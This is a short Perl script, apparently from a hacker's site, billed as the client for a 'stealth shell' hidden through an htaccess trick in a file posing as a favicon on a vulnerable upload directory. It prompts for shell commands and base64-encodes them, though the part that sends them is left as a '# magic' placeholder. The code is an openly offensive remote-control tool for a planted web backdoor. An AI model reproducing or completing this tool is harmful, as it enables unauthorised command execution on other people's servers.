#!/usr/bin/perl
# Interface for the mod_php htaccess stealth shell
# Written by Wireghoul - http://www.justanotherhacker.com

use warnings;
use strict;
use MIME::Base64;
use LWP::UserAgent;

&usage unless $ARGV[0];
my $url = $ARGV[0];
pop(@ARGV); #keep readline happy
my $ua = LWP::UserAgent->new;

sub usage {
    print "Usage: $0 url\nExample: $0 http://vuln.com/upload/favicon.ico\n";
    exit 2;
}

my $cmd = ''; my $b64;
until ($cmd eq 'exit') {
  print "shell> ";
  $cmd = readline;
  chomp $cmd;
  $b64 = encode_base64($cmd);
  # magic    
}
